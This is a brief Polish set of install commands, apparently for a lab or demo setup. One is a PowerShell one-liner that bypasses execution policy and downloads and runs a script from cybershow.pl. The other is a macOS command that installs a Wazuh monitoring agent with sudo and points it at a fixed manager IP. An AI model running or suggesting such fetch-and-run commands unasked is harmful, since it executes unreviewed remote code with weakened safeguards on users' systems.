## Kod uruchamiający skrypt w PowersShell zawarty na serwerze
`Set-ExecutionPolicy Bypass -Scope Process -Force; iwr -UserAgent "Mozilla/5.0" cybershow.pl/shell/install_friends.ps1 -OutFile s.ps1; .\s.ps1`

## Kod instalacji w terminalu pod Apple

curl -so wazuh-agent.pkg https://packages.wazuh.com/4.x/macos/wazuh-agent-4.9.2-1.pkg && sudo WAZUH_MANAGER='51.83.159.202' installer -pkg wazuh-agent.pkg -target /